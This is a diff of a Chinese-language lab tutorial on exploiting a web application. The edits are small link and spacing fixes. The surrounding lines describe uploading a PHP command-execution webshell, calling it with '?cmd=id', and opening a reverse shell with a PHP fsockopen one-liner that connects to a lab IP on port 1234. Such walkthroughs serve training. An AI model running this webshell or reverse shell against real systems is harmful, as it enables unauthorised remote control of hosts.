@@ -24,7 +24,7 @@
 
 ## 漏洞利用
 
-首先我们使用这个 [工具](https://www.revshells.com/) 生成一个远程命令执行的`php`文件：
+首先我们使用这个[工具](https://www.revshells.com/)生成一个远程命令执行的`php`文件：
 
 ![生成php文件](https://static.nextcyber.cn/attachments/images/course/task/d5e86687012e4396a6fb4eb64bec7874.png)
 
@@ -111,7 +111,7 @@ http://192.168.2.73:8080/Public/Uploads/2025-01-01/6774b03713797.php?cmd=id
 
 ## 反弹shell
 
-使用[工具](https://www.realcoding tech.com/online-handling/php-reverse-shell/)生成一个`php`的`反弹shell`命令：
+使用[工具](https://www.revshells.com/)生成一个`php`的`反弹shell`命令：
 
 ```
 php -r '$sock=fsockopen("192.168.2.6",1234);exec("/bin/bash <&3 >&3 2>&3");'
